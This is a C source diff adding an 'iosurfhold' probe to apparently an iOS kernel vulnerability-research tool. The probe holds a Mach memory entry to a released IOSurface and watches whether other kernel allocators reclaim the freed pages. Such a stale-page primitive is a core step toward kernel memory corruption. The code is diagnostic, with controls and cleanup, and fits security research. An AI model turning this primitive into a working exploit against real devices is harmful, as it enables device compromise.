@@ -1919,3 +1919,271 @@ int iosurf_reclaim_probe(const char *dir, int *stages)
     mep_log("[*] iosurfreclaim done rounds=%d hits=%d", rn, hits);
     return 0;
 }
+
+/* ===================================================================== */
+/* iosurfhold: does ANY non-IOSurface allocator take the freed pages of a  */
+/* PurpleGfxMem surface while no user mapping pins them?                  */
+/*                                                                        */
+/* The reclaim sweep (`--iosurfreclaim`) only tested app-reachable         */
+/* reclaimers allocated after the release. This probe keeps the carveout   */
+/* window open, drives heavy kernel churn, and watches the stale memory    */
+/* entry word-by-word: any content change anywhere in the range is a       */
+/* positive hit - the reclaimer's type does not have to be known or tagged. */
+/* Round 0 is an in-run positive control: fresh PurpleGfxMem surfaces are   */
+/* created immediately after the release and are expected to take the      */
+/* pages and overwrite the marker pattern.                                 */
+/* ===================================================================== */
+
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include <dlfcn.h>
+#include <stdarg.h>
+#include <stdio.h>
+#include <CoreFoundation/CoreFoundation.h>
+
+#define HOLD_ALLOC   0x8000
+#define HOLD_ITERS   48
+#define HOLD_CHURN_N 48
+
+static uint32_t hold_expected(size_t off)
+{
+    return 0xC0DE0000u | (uint32_t)((off >> 2) & 0x000FFFFFu);
+}
+
+/* Count words that differ from the per-offset marker; report the first one. */
+static uint64_t hold_scan(mach_vm_address_t a, size_t len,
+                          uint32_t *first_off, uint32_t *first_got)
+{
+    uint64_t bad = 0;
+    uint32_t fo = 0xffffffffu, fg = 0;
+    for (size_t off = 0; off + 4 <= len; off += 4) {
+        uint32_t v = *(volatile uint32_t *)(uintptr_t)(a + off);
+        if (v != hold_expected(off)) {
+            if (bad == 0) { fo = (uint32_t)off; fg = v; }
+            bad++;
+            if (bad > 0xFFFFFFu) break;
+        }
+    }
+    if (first_off) *first_off = fo;
+    if (first_got) *first_got = fg;
+    return bad;
+}
+
+/* One burst of kernel allocation churn. Everything created is destroyed     */
+/* before returning: no fd/port leak, no unbounded growth. kind 5 uses plain */
+/* (non-region) IOSurfaces as an internal negative control.                 */
+static int hold_churn(const char *dir, int kind, int n)
+{
+    int made = 0;
+    switch (kind) {
+    case 0: {   /* sockets: TCP / UDP / AF_UNIX stream / raw(denied) */
+        for (int i = 0; i < n; i++) {
+            int fam = AF_INET, type = SOCK_STREAM;
+            if ((i % 4) == 1) type = SOCK_DGRAM;
+            if ((i % 4) == 2) { fam = AF_UNIX; type = SOCK_STREAM; }
+            if ((i % 4) == 3) type = SOCK_RAW;
+            int fd = socket(fam, type, 0);
+            if (fd >= 0) {
+                int one = 1;
+                setsockopt(fd, SOL_SOCKET, SO_NOSIGPIPE, &one, sizeof(one));
+                close(fd);
+                made++;
+            }
+        }
+        break;
+    }
+    case 1:     /* pipes */
+        for (int i = 0; i < n; i++) {
+            int p[2];
+            if (pipe(p) == 0) {
+                (void)!write(p[1], "x", 1);
+                close(p[0]);
+                close(p[1]);
+                made++;
+            }
+        }
+        break;
+    case 2: {   /* VM allocations + writes */
+        for (int i = 0; i < n; i++) {
+            vm_address_t a = 0;
+            if (vm_allocate(mach_task_self(), &a, 0x4000, VM_FLAGS_ANYWHERE) == KERN_SUCCESS) {
+                *(volatile uint32_t *)(uintptr_t)a = 0x11223344u;
+                vm_deallocate(mach_task_self(), a, 0x4000);
+                made++;
+            }
+        }
+        break;
+    }
+    case 3: {   /* temp files */
+        char path[256];
+        for (int i = 0; i < n; i++) {
+            snprintf(path, sizeof(path), "%s/hold_%d_%d", dir, kind, i);
+            int fd = open(path, O_CREAT | O_WRONLY | O_TRUNC, 0600);
+            if (fd >= 0) {
+                (void)!write(fd, path, strlen(path));
+                close(fd);
+                unlink(path);
+                made++;
+            }
+        }
+        break;
+    }
+    case 4: {   /* mach ports */
+        for (int i = 0; i < n; i++) {
+            mach_port_t p = MACH_PORT_NULL;
+            if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) == KERN_SUCCESS) {
+                mach_port_destroy(mach_task_self(), p);
+                made++;
+            }
+        }
+        break;
+    }
+    case 5: {   /* plain IOSurfaces: different backing object */
+        for (int i = 0; i < n; i++) {
+            iosr_ref_t s = iosr_make(0);
+            if (s) { CFRelease(s); made++; }
+        }
+        break;
+    }
+    default:
+        break;
+    }
+    return made;
+}
+
+int iosurf_hold_probe(const char *dir, int rounds, int *stages)
+{
+    if (!stages) return -1;
+    for (int i = 0; i < 64; i++) stages[i] = 0;
+    if (rounds <= 0) rounds = 4;
+
+    void *fh = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface",
+                      RTLD_NOW);
+    if (!fh) fh = dlopen("IOSurface", RTLD_NOW);
+    if (!fh) {
+        mep_log("[-] iosurfhold: dlopen IOSurface failed: %s", dlerror());
+        return 0;
+    }
+    g_iosr_create  = (iosr_create_fn)dlsym(fh, "IOSurfaceCreate");
+    g_iosr_getid   = (iosr_getid_fn)dlsym(fh, "IOSurfaceGetID");
+    g_iosr_getbase = (iosr_getbase_fn)dlsym(fh, "IOSurfaceGetBaseAddress");
+    g_iosr_getalloc = (iosr_getalloc_fn)dlsym(fh, "IOSurfaceGetAllocSize");
+    void *lh = dlopen("/usr/lib/libSystem.B.dylib", RTLD_NOW);
+    g_iosr_vm_map = (iosr_mach_vm_map_fn)dlsym(lh ? lh : RTLD_DEFAULT,
+                                               "mach_vm_map");
+    if (!g_iosr_create || !g_iosr_getid || !g_iosr_getbase ||
+        !g_iosr_getalloc || !g_iosr_vm_map) {
+        mep_log("[-] iosurfhold: a required symbol is missing");
+        return 0;
+    }
+
+    mep_log("[*] iosurfhold start alloc=0x%x iters=%d churn=%d rounds=%d",
+            HOLD_ALLOC, HOLD_ITERS, HOLD_CHURN_N, rounds);
+
+    static const int churn_kinds[6] = { 0, 1, 2, 3, 4, 5 };
+    int rn = 0;
+    uint64_t test_worst = 0;
+
+    for (int r = 0; r < rounds && rn < 60; r++) {
+        int ctrl = (r == 0);
+        iosr_ref_t s = iosr_make_sized(1, HOLD_ALLOC);
+        if (!s) {
+            mep_log("[-] iosurfhold round %d: region surface create failed", r);
+            stages[rn++] = -1;
+            continue;
+        }
+        uint64_t base = (uint64_t)(uintptr_t)g_iosr_getbase(s);
+        size_t alloc = g_iosr_getalloc(s);
+        for (size_t off = 0; off + 4 <= alloc; off += 4)
+            *(volatile uint32_t *)(uintptr_t)(base + off) = hold_expected(off);
+        uint32_t w0 = *(volatile uint32_t *)(uintptr_t)base;
+
+        mach_vm_size_t esz = (mach_vm_size_t)alloc;
+        mach_port_t obj = MACH_PORT_NULL;
+        kern_return_t kr = mach_make_memory_entry_64(
+            mach_task_self(), &esz, (mach_vm_offset_t)base,
+            VM_PROT_READ | VM_PROT_WRITE, &obj, MACH_PORT_NULL);
+        mep_log("[*] iosurfhold r%d ctrl=%d id=0x%x base=0x%llx alloc=0x%zx "
+                "marker=0x%08x entryKR=%d handle=0x%x",
+                r, ctrl, g_iosr_getid(s), (unsigned long long)base, alloc, w0,
+                (int)kr, (unsigned)obj);
+        if (kr != KERN_SUCCESS || obj == MACH_PORT_NULL) {
+            CFRelease(s);
+            stages[rn++] = -2;
+            continue;
+        }
+
+        /* Confirm the alias, then drop every user mapping before release. */
+        mach_vm_address_t a1 = 0;
+        kr = g_iosr_vm_map(mach_task_self(), &a1, esz, 0, VM_FLAGS_ANYWHERE,
+                           obj, 0, FALSE, VM_PROT_READ | VM_PROT_WRITE,
+                           VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
+        uint32_t m1 = (kr == KERN_SUCCESS && a1)
+                          ? *(volatile uint32_t *)(uintptr_t)a1 : 0xdeadbeefu;
+        if (a1) vm_deallocate(mach_task_self(), (vm_address_t)a1, (vm_size_t)esz);
+        mep_log("[*] iosurfhold r%d alias1 kr=%d marker=0x%08x same=%s "
+                "(no user mapping remains)",
+                r, (int)kr, m1, (m1 == hold_expected(0)) ? "YES" : "no");
+
+        CFRelease(s);
+        mep_log("[*] iosurfhold r%d surface released; window open%s",
+                r, ctrl ? " (control: spray fresh region surfaces)" : "");
+
+        if (ctrl) {
+            int kept = iosr_spray(1, 8);
+            int idx = iosr_find_base(base);
+            for (int i = 0; i < kept; i++)
+                *(volatile uint32_t *)(uintptr_t)g_iosr_getbase(g_iosr_keep[i]) =
+                    0x5A5A0000u | (uint32_t)i;
+            mep_log("[*] iosurfhold r%d control spray kept=%d old_base_reused=%s idx=%d",
+                    r, kept, idx >= 0 ? "YES" : "no", idx);
+        }
+
+        /* Watch loop: map briefly, scan, unmap, churn. Iteration 0 runs before
+           any churn so the immediate post-release state is recorded too. */
+        uint64_t worst = 0;
+        uint32_t woff = 0, wgot = 0;
+        int changed_iters = 0, map_fail = 0;
+        for (int it = 0; it < HOLD_ITERS; it++) {
+            mach_vm_address_t a2 = 0;
+            kr = g_iosr_vm_map(mach_task_self(), &a2, esz, 0, VM_FLAGS_ANYWHERE,
+                               obj, 0, FALSE, VM_PROT_READ | VM_PROT_WRITE,
+                               VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
+            if (kr == KERN_SUCCESS && a2) {
+                uint32_t fo = 0xffffffffu, fg = 0;
+                uint64_t bad = hold_scan(a2, esz, &fo, &fg);
+                if (bad > worst) { worst = bad; woff = fo; wgot = fg; }
+                if (bad) changed_iters++;
+                vm_deallocate(mach_task_self(), (vm_address_t)a2, (vm_size_t)esz);
+            } else {
+                map_fail++;
+            }
+            int made = hold_churn(dir, churn_kinds[it % 6], HOLD_CHURN_N);
+            if (it == 0 || it % 12 == 11)
+                mep_log("[*] iosurfhold r%d watch it=%d worstMismatch=%llu "
+                        "changedIters=%d mapFail=%d churnMade=%d",
+                        r, it, (unsigned long long)worst, changed_iters,
+                        map_fail, made);
+            usleep(40000);
+        }
+
+        mep_log("[*] iosurfhold r%d VERDICT ctrl=%d worstMismatch=%llu firstOff=0x%x "
+                "firstVal=0x%x changedIters=%d/%d mapFail=%d",
+                r, ctrl, (unsigned long long)worst, woff, wgot, changed_iters,
+                HOLD_ITERS, map_fail);
+        stages[rn++] = (worst > 0x7FFFFFFFu) ? 0x7FFFFFFF : (int)worst;
+        if (!ctrl && worst > test_worst) test_worst = worst;
+
+        mach_port_deallocate(mach_task_self(), obj);
+        iosr_release_all();
+    }
+
+    mep_log("[*] iosurfhold done rounds=%d testWorstMismatch=%llu -> %s",
+            rn, (unsigned long long)test_worst,
+            test_worst ? "SOMETHING TOOK THE PAGES" : "no non-IOSurface reclaimer seen");
+    return 0;
+}
